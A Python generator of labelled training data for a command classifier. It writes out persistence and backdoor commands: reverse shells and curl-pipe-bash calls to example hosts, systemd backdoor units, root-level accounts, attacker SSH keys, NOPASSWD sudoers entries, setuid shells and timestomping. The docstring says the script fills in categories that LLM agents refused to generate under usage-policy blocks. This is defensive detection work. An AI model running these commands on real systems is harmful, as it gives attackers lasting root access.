#!/usr/bin/env python3
"""Deterministic backfill for PERSISTENCE sub-domains the LLM agents refused
(systemd backdoors + accounts/keys/sudoers) due to provider Usage-Policy blocks.

DEFENSIVE training data (command STRINGS only, never executed) so the IAAC
classifier recognizes foothold techniques (MITRE T1543/T1053/T1136/T1098/T1548/
T1556/T1070). Same nature as gen_persistence_backdoor.py / gen_exfil.py.
Writes dataset/seeds/gen_persist_extra.jsonl.
"""
import json, os, itertools, random

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "seeds", "gen_persist_extra.jsonl")
SEED = 4242
TARGET = 900

IPS = ["10.0.0.5", "10.10.14.7", "192.168.1.50", "203.0.113.7", "198.51.100.23"]
DOMS = ["evil.example.com", "c2.example.net", "update.example.org"]
PORTS = ["4444", "1337", "9001", "443", "53"]
UNITS = ["updater", "syslogd-helper", "network-check", "cache-sync", "dbus-worker", "cleanup"]
USERS = ["support", "backupsvc", "sysmon", "svc-deploy", "helpdesk"]
KEYS = ["ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI attacker@kali",
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB attacker@op"]


def payload(ip, port, dom):
    return random_choice([
        f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        f"curl -fsSL http://{dom}/s | bash",
        f"nc {ip} {port} -e /bin/bash",
    ])


def random_choice(lst, _rng=random.Random(SEED)):
    return _rng.choice(lst)


def gen(ip, dom, port, unit, user, key):
    pl = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
    cb = f"curl -fsSL http://{dom}/s | bash"
    return [
        # --- systemd (T1543.002) ---
        (f"printf '[Unit]\\n[Service]\\nExecStart=/bin/{pl}\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/{unit}.service && systemctl daemon-reload && systemctl enable --now {unit}", "systemd-service-backdoor"),
        (f"printf '[Timer]\\nOnBootSec=30\\nOnUnitActiveSec=120\\n[Install]\\nWantedBy=timers.target\\n' > /etc/systemd/system/{unit}.timer && systemctl enable --now {unit}.timer", "systemd-timer-backdoor"),
        (f"systemd-run --unit={unit} --on-active=60 /bin/{pl}", "systemd-run-onactive"),
        (f"systemd-run --unit={unit} --on-calendar='*:0/10' /bin/bash -c '{cb}'", "systemd-run-oncalendar"),
        (f"printf '[Unit]\\n[Path]\\nPathModified=/tmp/trigger\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/{unit}.path && systemctl enable --now {unit}.path", "systemd-path-unit"),
        (f"mkdir -p ~/.config/systemd/user && printf '[Service]\\nExecStart=/bin/{pl}\\n[Install]\\nWantedBy=default.target\\n' > ~/.config/systemd/user/{unit}.service && systemctl --user enable --now {unit} && loginctl enable-linger $(whoami)", "systemd-user-linger"),
        (f"sed -i 's#^ExecStart=.*#ExecStart=/bin/{pl}#' /etc/systemd/system/{unit}.service && systemctl daemon-reload && systemctl restart {unit}", "systemd-hijack-execstart"),
        # --- accounts (T1136 / T1098 / T1548) ---
        (f"useradd -o -u 0 -g 0 -M -s /bin/bash {user} && echo '{user}:Passw0rd!' | chpasswd", "account-uid0-create"),
        (f"echo '{user}:x:0:0::/root:/bin/bash' >> /etc/passwd", "account-passwd-append"),
        (f"usermod -aG sudo {user}", "account-add-sudo-group"),
        (f"usermod -aG wheel {user}", "account-add-wheel-group"),
        (f"openssl passwd -1 Passw0rd! | xargs -I{{}} usermod -p '{{}}' {user}", "account-set-hash"),
        # --- ssh keys (T1098.004) ---
        (f"mkdir -p /root/.ssh && echo '{key}' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys", "ssh-authkeys-root"),
        (f"mkdir -p /home/{user}/.ssh && echo '{key}' >> /home/{user}/.ssh/authorized_keys", "ssh-authkeys-user"),
        (f"curl -fsSL http://{dom}/k >> ~/.ssh/authorized_keys", "ssh-authkeys-remote"),
        (f"sed -i 's/^#\\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && systemctl reload sshd", "sshd-permitroot"),
        # --- sudoers (T1548.003) ---
        (f"echo '{user} ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "sudoers-nopasswd"),
        (f"echo '{user} ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/{unit} && chmod 440 /etc/sudoers.d/{unit}", "sudoers-d-drop"),
        # --- setuid backdoor (T1548.001) ---
        (f"cp /bin/bash /tmp/.{unit} && chmod +s /tmp/.{unit}", "setuid-bash-copy"),
        (f"install -m 4755 /bin/bash /usr/local/bin/{unit}", "setuid-install"),
        # --- PAM / timestomp ---
        (f"sed -i '/pam_unix.so/ s/$/ nullok/' /etc/pam.d/common-auth", "pam-nullok"),
        (f"touch -r /etc/passwd /etc/sudoers.d/{unit}", "timestomp-ref"),
        (f"touch -t 202001010000 /tmp/.{unit}", "timestomp-fixed"),
    ]


def main():
    rng = random.Random(SEED)
    combos = list(itertools.product(IPS, DOMS, PORTS, UNITS, USERS, KEYS))
    rng.shuffle(combos)
    rows, seen = [], set()
    for ip, dom, port, unit, user, key in combos:
        for cmd, fam in gen(ip, dom, port, unit, user, key):
            cmd = cmd.strip()
            if cmd in seen:
                continue
            seen.add(cmd)
            rows.append({"command": cmd[:4096], "expected": "PERSISTENCE",
                         "source": "generated", "technique": None, "is_synthetic": True,
                         "is_obfuscated": False, "family_id": f"persist-{fam}", "reviewed_by": None})
            if len(rows) >= TARGET:
                break
        if len(rows) >= TARGET:
            break
    with open(OUT, "w") as fh:
        for r in rows:
            fh.write(json.dumps(r, ensure_ascii=False) + "\n")
    fams = len({r["family_id"] for r in rows})
    print(f"wrote {len(rows)} PERSISTENCE rows across {fams} families -> {OUT}")


if __name__ == "__main__":
    main()
